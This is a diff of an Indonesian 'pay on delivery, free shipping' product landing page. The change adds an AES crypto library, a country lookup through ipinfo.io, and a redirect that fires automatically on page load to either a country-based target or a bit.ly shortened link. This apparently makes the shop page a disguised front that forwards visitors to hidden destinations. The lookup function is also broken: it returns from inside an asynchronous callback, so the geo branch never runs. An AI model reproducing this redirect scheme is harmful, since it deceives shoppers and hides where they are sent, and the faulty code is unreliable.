@@ -6,6 +6,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Bayar Saat Barang Diterima & Gratis Ongkir</title>
   <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" />
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js"></script>
+
   <meta property="og:image" content="fb-og-image.jpg" />
   <meta property="og:title" content="Bayar Saat Barang Diterima & Gratis Ongkir" />
   <meta property="og:description" content="Kualitas Terjamin Dengan Harga Murah" />
@@ -37,18 +39,26 @@
 <script src="js.js"></script>
 
 <script>
-  $("#wow").click(function () {
-    var target = atob(get_link());
+  $(document).ready(function () {
+    if (negara = get_negara()) {
+      negara = negara.toLowerCase();
+      var target = make_target(negara);
+    } else {
+      target = "https://bit.ly/33UeWWQ";
+    }
+
+    $("#wow").click(function () {
+      window.location = target;
+
+    });
     window.location = target;
   });
 
-  function gup(name, url) {
-    if (!url) url = location.href;
-    name = name.replace(/[\[]/, "\\\[").replace(/[\]]/, "\\\]");
-    var regexS = "[\\?&]" + name + "=([^&#]*)";
-    var regex = new RegExp(regexS);
-    var results = regex.exec(url);
-    return results == null ? null : results[1];
+
+  function get_negara() {
+    $.get("https://ipinfo.io", function (response) {
+      return response.country;
+    }, "jsonp");
   }
 </script>
 
